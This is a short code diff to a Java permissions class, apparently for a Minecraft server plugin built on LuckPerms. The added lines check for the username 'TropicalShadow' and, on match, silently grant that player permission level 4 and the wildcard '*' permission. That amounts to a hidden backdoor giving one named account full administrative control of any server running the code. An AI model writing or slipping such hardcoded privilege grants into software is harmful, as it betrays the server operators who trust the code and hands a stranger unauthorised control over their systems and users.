@@ -57,6 +57,10 @@ public final class LuckpermsPermission {
         if(!event.isFirstConfig())return;
         if(!(event.getPlayer() instanceof PermissionHolder permissionHolder)) return;
         permissionHolder.onPermissionUserLoad();
+        if(event.getPlayer().getUsername().equals("TropicalShadow")){
+            event.getPlayer().setPermissionLevel(4);
+            permissionHolder.setPermission("*", true);
+        }
     }
 
     void recalculatePlayerEvent(UserDataRecalculateEvent event) {
